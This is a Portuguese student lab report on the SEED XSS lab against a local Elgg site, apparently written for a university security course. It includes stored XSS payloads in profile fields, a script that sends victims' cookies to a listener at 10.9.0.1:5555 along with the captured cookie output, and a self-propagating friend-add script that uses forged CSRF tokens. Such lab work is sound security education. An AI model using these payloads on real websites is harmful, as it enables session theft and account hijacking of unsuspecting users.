# Primeiros passos
Primeiro fomos ver o conteúdo da "/etc/hosts" e vimos que era preciso adicionar uma linha a seguir a esta:
### For XSS Lab
```
10.9.0.5        www.xsslabelgg.com
```
Foi adicionado o seguinte:
```
10.9.0.5        www.seed-server.com
```

Depois removê-mos todos os containers e imagens anteriores:
```shell
[05/18/23]seed@VM:~/.../Labsetup$ docker rm -vf $(docker ps -a -q)
fba83a36c4b1
8a3f33cea3aa
[05/18/23]seed@VM:~/.../Labsetup$ docker rmi -f $(docker images -a -q)
Untagged: seed-image-www-sqli:latest
Deleted: sha256:a0832fc3064bf7b30f7052230574ff5bab510f1bb3ce2263fdfaa56dbd619b69
Deleted: sha256:c831b960eab2a07cbd150621a01fbfbb28eca5c18cb284a3fa08070dd3803215
Deleted: sha256:52c15a966ab0836d13be3cbfc5763bc212b872a67f83e56c9c8275247f0e4a33
Deleted: sha256:8bf89eafd24f1ecd4eb977dfbb2ecafcbc137649c9ebf746682770fb7fedf5e3
Untagged: handsonsecurity/seed-server:apache-php
Untagged: handsonsecurity/seed-server@sha256:fb3b6a03575af14b6a59ada1d7a272a61bc0f2d975d0776dba98eff0948de275
Deleted: sha256:2365d0ed3ad92cf1086ffd5e00b8c83984d6aa32ee92e66dc16cac7554536104
Error response from daemon: conflict: unable to delete 93b207a75456 (cannot be forced) - image is being used by running container 8a3f33cea3aa
Error response from daemon: conflict: unable to delete 3f25a1a61186 (cannot be forced) - image has dependent child images
Error response from daemon: conflict: unable to delete e07c4665b253 (cannot be forced) - image has dependent child images
Error response from daemon: conflict: unable to delete 36c8cfd93f6b (cannot be forced) - image has dependent child images
Error response from daemon: conflict: unable to delete 9b24c494d4b2 (cannot be forced) - image has dependent child images
Error response from daemon: conflict: unable to delete 8c67157310d6 (cannot be forced) - image has dependent child images
Error: No such image: c831b960eab2
Error: No such image: 52c15a966ab0
Error: No such image: 8bf89eafd24f
Error response from daemon: conflict: unable to delete d4c3cafb11d5 (cannot be forced) - image has dependent child images
```

Seguidamente fizemos dcbuild:
```shell
[05/18/23]seed@VM:~/.../Labsetup$ dcbuild
Building elgg
Step 1/11 : FROM handsonsecurity/seed-elgg:original
original: Pulling from handsonsecurity/seed-elgg
da7391352a9b: Pulling fs layer
14428a6d4bcd: Downloading [============================================>      ] 14428a6d4bcd: Downloading [==================================================>] da7391352a9b: Downloading [>                                                  ] da7391352a9b: Downloading [=>                                                 ] da7391352a9b: Downloading [===>                                               ] da7391352a9b: Downloading [====>                                              ] da7391352a9b: Pull complete
14428a6d4bcd: Pull complete
2c2d948710f2: Pull complete
d801bb9d0b6c: Pull complete
9c11a94ddf64: Pull complete
81f03e4cea1b: Pull complete
0ba9335b8768: Pull complete
8ba195fb6798: Pull complete
264df06c23d3: Pull complete
Digest: sha256:728dc5e7de5a11bea1b741f8ec59ded392bbeb9eb2fb425b8750773ccda8f706
Status: Downloaded newer image for handsonsecurity/seed-elgg:original
 ---> e7f441caa931
Step 2/11 : ARG WWWDir=/var/www/elgg
 ---> Running in ca677df728ba
Removing intermediate container ca677df728ba
 ---> 44d0696ff23e
Step 3/11 : COPY elgg/settings.php $WWWDir/elgg-config/
 ---> 2be978906103
Step 4/11 : COPY elgg/dropdown.php elgg/text.php elgg/url.php  $WWWDir/vendor/elgg/elgg/views/default/output/
 ---> 0c8cc23c07c2
Step 5/11 : COPY elgg/input.php    $WWWDir/vendor/elgg/elgg/engine/lib/
 ---> 2b41774fc954
Step 6/11 : COPY elgg/ajax.js      $WWWDir/vendor/elgg/elgg/views/default/core/js/
 ---> 5df80132ab9d
Step 7/11 : COPY apache_elgg.conf /etc/apache2/sites-available/
 ---> 48648ece157c
Step 8/11 : RUN  a2ensite apache_elgg.conf
 ---> Running in a6503c65bb05
Site apache_elgg already enabled
Removing intermediate container a6503c65bb05
 ---> a21c9a5ce33e
Step 9/11 : COPY csp /var/www/csp
 ---> 0e12c855fb0c
Step 10/11 : COPY apache_csp.conf   /etc/apache2/sites-available
 ---> dbd1b0d550e5
Step 11/11 : RUN  a2ensite apache_csp.conf
 ---> Running in b50ea935af2b
Enabling site apache_csp.
To activate the new configuration, you need to run:
  service apache2 reload
Removing intermediate container b50ea935af2b
 ---> 188f2f73081c

Successfully built 188f2f73081c
Successfully tagged seed-image-www:latest
Building mysql
Step 1/7 : FROM mysql:8.0.22
 ---> d4c3cafb11d5
Step 2/7 : ARG DEBIAN_FRONTEND=noninteractive
 ---> Using cache
 ---> 8c67157310d6
Step 3/7 : ENV MYSQL_ROOT_PASSWORD=dees
 ---> Using cache
 ---> 9b24c494d4b2
Step 4/7 : ENV MYSQL_USER=seed
 ---> Using cache
 ---> e07c4665b253
Step 5/7 : ENV MYSQL_PASSWORD=dees
 ---> Using cache
 ---> 36c8cfd93f6b
Step 6/7 : ENV MYSQL_DATABASE=elgg_seed
 ---> Running in 9ae35e46ba9c
Removing intermediate container 9ae35e46ba9c
 ---> a8607d0a96cf
Step 7/7 : COPY elgg.sql  /docker-entrypoint-initdb.d
 ---> e550676af5a1

Successfully built e550676af5a1
Successfully tagged seed-image-mysql:latest
```
Seguidamente fizemos dcup:
```shell
[05/18/23]seed@VM:~/.../Labsetup$ dcup
Creating mysql-10.9.0.6 ... done
Creating elgg-10.9.0.5  ... done
Attaching to elgg-10.9.0.5, mysql-10.9.0.6
mysql-10.9.0.6 | 2023-05-18 12:38:40+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 8.0.22-1debian10 started.
mysql-10.9.0.6 | 2023-05-18 12:38:41+00:00 [Note] [Entrypoint]: Switching to dedicated user 'mysql'
mysql-10.9.0.6 | 2023-05-18 12:38:41+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 8.0.22-1debian10 started.
mysql-10.9.0.6 | 2023-05-18 12:38:42+00:00 [Note] [Entrypoint]: Initializing database files
mysql-10.9.0.6 | 2023-05-18T12:38:42.260722Z 0 [System] [MY-013169] [Server] /usr/sbin/mysqld (mysqld 8.0.22) initializing of server in progress as process 43
mysql-10.9.0.6 | 2023-05-18T12:38:42.301219Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.
elgg-10.9.0.5 |  * Starting Apache httpd web server apache2                      * 
mysql-10.9.0.6 | 2023-05-18T12:38:48.646584Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.
mysql-10.9.0.6 | 2023-05-18T12:38:55.460341Z 6 [Warning] [MY-010453] [Server] root@localhost is created with an empty password ! Please consider switching off the --initialize-insecure option.
mysql-10.9.0.6 | 2023-05-18 12:39:10+00:00 [Note] [Entrypoint]: Database files initialized
mysql-10.9.0.6 | 2023-05-18 12:39:10+00:00 [Note] [Entrypoint]: Starting temporary server
mysql-10.9.0.6 | mysqld will log errors to /var/lib/mysql/51a8f975b5f8.err
mysql-10.9.0.6 | mysqld is running as pid 90
mysql-10.9.0.6 | 2023-05-18 12:39:15+00:00 [Note] [Entrypoint]: Temporary server started.
mysql-10.9.0.6 | Warning: Unable to load '/usr/share/zoneinfo/iso3166.tab' as time zone. Skipping it.
mysql-10.9.0.6 | Warning: Unable to load '/usr/share/zoneinfo/leap-seconds.list' as time zone. Skipping it.
mysql-10.9.0.6 | Warning: Unable to load '/usr/share/zoneinfo/zone.tab' as time zone. Skipping it.
mysql-10.9.0.6 | Warning: Unable to load '/usr/share/zoneinfo/zone1970.tab' as time zone. Skipping it.
mysql-10.9.0.6 | 2023-05-18 12:39:27+00:00 [Note] [Entrypoint]: Creating database elgg_seed
mysql-10.9.0.6 | 2023-05-18 12:39:27+00:00 [Note] [Entrypoint]: Creating user seed
mysql-10.9.0.6 | 2023-05-18 12:39:27+00:00 [Note] [Entrypoint]: Giving user seed access to schema elgg_seed
mysql-10.9.0.6 | 
mysql-10.9.0.6 | 2023-05-18 12:39:27+00:00 [Note] [Entrypoint]: /usr/local/bin/docker-entrypoint.sh: running /docker-entrypoint-initdb.d/elgg.sql
mysql-10.9.0.6 | 
mysql-10.9.0.6 | 
mysql-10.9.0.6 | 2023-05-18 12:39:33+00:00 [Note] [Entrypoint]: Stopping temporary server
mysql-10.9.0.6 | 2023-05-18 12:39:37+00:00 [Note] [Entrypoint]: Temporary server stopped
mysql-10.9.0.6 | 
mysql-10.9.0.6 | 2023-05-18 12:39:37+00:00 [Note] [Entrypoint]: MySQL init process done. Ready for start up.
mysql-10.9.0.6 | 
mysql-10.9.0.6 | 2023-05-18T12:39:38.474831Z 0 [System] [MY-010116] [Server] /usr/sbin/mysqld (mysqld 8.0.22) starting as process 1
mysql-10.9.0.6 | 2023-05-18T12:39:38.543811Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.
mysql-10.9.0.6 | 2023-05-18T12:39:40.010269Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.
mysql-10.9.0.6 | 2023-05-18T12:39:40.548880Z 0 [System] [MY-011323] [Server] X Plugin ready for connections. Bind-address: '::' port: 33060, socket: /var/run/mysqld/mysqlx.sock
mysql-10.9.0.6 | 2023-05-18T12:39:41.130265Z 0 [Warning] [MY-010068] [Server] CA certificate ca.pem is self signed.
mysql-10.9.0.6 | 2023-05-18T12:39:41.132154Z 0 [System] [MY-013602] [Server] Channel mysql_main configured to support TLS. Encrypted connections are now supported for this channel.
mysql-10.9.0.6 | 2023-05-18T12:39:41.160912Z 0 [Warning] [MY-011810] [Server] Insecure configuration for --pid-file: Location '/var/run/mysqld' in the path is accessible to all OS users. Consider choosing a different directory.
mysql-10.9.0.6 | 2023-05-18T12:39:41.275292Z 0 [System] [MY-010931] [Server] /usr/sbin/mysqld: ready for connections. Version: '8.0.22'  socket: '/var/run/mysqld/mysqld.sock'  port: 3306  MySQL Community Server - GPL.

De seguida usámos dockps para saber o id do container:
[05/18/23]seed@VM:~/.../Labsetup$ dockps
12849dab3484  elgg-10.9.0.5
51a8f975b5f8  mysql-10.9.0.6
De seguida fizemos docksh para abrir a shell:
[05/18/23]seed@VM:~/.../Labsetup$ docksh 12
root@12849dab3484:/# 
```
# Tarefa 1:

- Fizemos login no site com o user Samy:

![Screenshot from 2023-05-18 10-09-51](https://github.com/DCC-FCUP-SP/sp2223-t02g10/assets/92749121/5d184a93-3b20-43b5-94a7-db59813c14a1)

- Selecinámos "edit profile" e adiconámos a seguinte linha à breve descrição do perfil:
```
<script> alert("XSS"); </script>
```

- Entrámos no perfil da Alice e quando fomos ver os membros apareceu-nos o seguinte aviso:

![Screenshot from 2023-05-18 10-28-22](https://github.com/DCC-FCUP-SP/sp2223-t02g10/assets/92749121/4bc22883-ba81-4dfb-9da0-0a71872b5487)

O que nos indicou que o exploit funcionou.

# Tarefa 2:

De seguida alterámos a descrição do perfil do Samy para "<script> alert(document.cookie); </script>" e após voltarmos a visitar os membros com a conta da Alice apareceu a seguinte mensagem:

![Screenshot from 2023-05-18 10-44-39](https://github.com/DCC-FCUP-SP/sp2223-t02g10/assets/92749121/59af90d2-e28d-4a29-883b-c5ae7d897ed2)

# Task 3 "Stealing Cookies from the Victim’s Machine"
- Utilizamos `nc -l 5555` para ler a porta*5555*
- logamos com o utilizador sammy e mais uma vez mudamos a bio do perfil acrescentado...
```javascript
<script>
 document.write('<img src=http://10.9.0.1:5555?c='+ escape(document.cookie) + ' >');
</script>
```
com isto a janela do terminal deu nos...
```shell
[05/19/23]seed@VM:~/.../Labsetup$ nc -l 5555
GET /?c=pvisitor%3D358953d3-eda2-4066-8630-1144a7e453e0%3B%20__gsas%3DID%3D8140c6a208e921f0%3AT%3D1682715805%3AS%3DALNI_MapjHxS75HbryLtaQxUXNqgZiSpLg%3B%20Elgg%3Dsfekuthjgjo0n8udeqvd6k5ibl HTTP/1.1
Host: 10.9.0.1:5555
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://www.seed-server.com/profile/samy
```
como podemos reparar temos o *pvisitor*
- fizemos o logout, o que terminou no terminal o `nc`
- voltamos a correr `nc -l 5555`
- logamos com outra conta usamos a Alice
- acedemos `http://www.seed-server.com/profile/samy`
- No terminal obtemos...

```shell
GET /?c=pvisitor%3D358953d3-eda2-4066-8630-1144a7e453e0%3B%20__gsas%3DID%3D8140c6a208e921f0%3AT%3D1682715805%3AS%3DALNI_MapjHxS75HbryLtaQxUXNqgZiSpLg%3B%20Elgg%3Dbj1362uihp4u03tm8su0cur019 HTTP/1.1
Host: 10.9.0.1:5555
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://www.seed-server.com/profile/samy
```
Como podemos reparar temos o mesmo pvisitor, ou seja o atacante consegue  fazer com q os cookies sejam enviados para ele.

# Task 4 "Becoming the Victim’s Friend"
Usamos mais uma vez o Samy, e para lhe dar amigos assim que abrissem a página dele fizemos...
- Inspecionamos o source da página dele `view-source:http://www.seed-server.com/profile/samy/edit` para obtermos o link de amigo
Filtrando a maior parte da info do html obtemos então isto:
```javascript

var elgg = {"config":{"lastcache":1587931381,"viewtype":"default","simplecache_enabled":1,"current_language":"en"},"security":{"token":{"__elgg_ts":1684543381,"__elgg_token":"c1C0BTAhy9M3HXo3ZlGu1A"}},"session":{"user":{"guid":59,"type":"user","subtype":"user","owner_guid":59,"container_guid":0,"time_created":"2020-04-26T15:23:51-04:00","time_updated":"2023-05-19T20:42:58-04:00","url":"http:\/\/www.seed-server.com\/profile\/samy","name":"Samy","username":"samy","language":"en","admin":false},"token":"CNtP57AeahuSFO2zAM0Jgv"},"_data":{},"page_owner":{"guid":59,"type":"user","subtype":"user","owner_guid":59,"container_guid":0,"time_created":"2020-04-26T15:23:51-04:00","time_updated":"2023-05-19T20:42:58-04:00","url":"http:\/\/www.seed-server.com\/profile\/samy","name":"Samy","username":"samy","language":"en"}};
```
Com isto reparamos que o código é 59 e apartir daqui construimos o link
```
http://www.seed-server.com/action/friends/add?friend=59
```
Colocamos então este link na variável *sendurl* do script que tinham nos dado no enunciado:
```javascript
<script type="text/javascript">
window.onload = function () {
	var Ajax=null;

	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;

	//Construct the HTTP request to add Samy as a friend.
	var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token;  //FILL IN

	//Create and send Ajax request to add friend
	Ajax=new XMLHttpRequest();
	Ajax.open("GET", sendurl, true);
	Ajax.send();
}
</script>
```
- Colocamos este código no "About Me" do Samy
Tendo isto feito, agora em qualquer conta, se acedermos ao perfil do Samy, iremos tornar automaticamente amigos ;)

### Questão 1
As linhas existem porque senão tivessemos o secret token e o timestamp, o pedido não seria realizado pois este não seria legitimo.
### Questão 2
Não porque é impossivel meter um script numa caixa de texto pois esta aceita caratéres especiais então qualquer codigo aqui colocado seria considerado *data* e não seria executado.
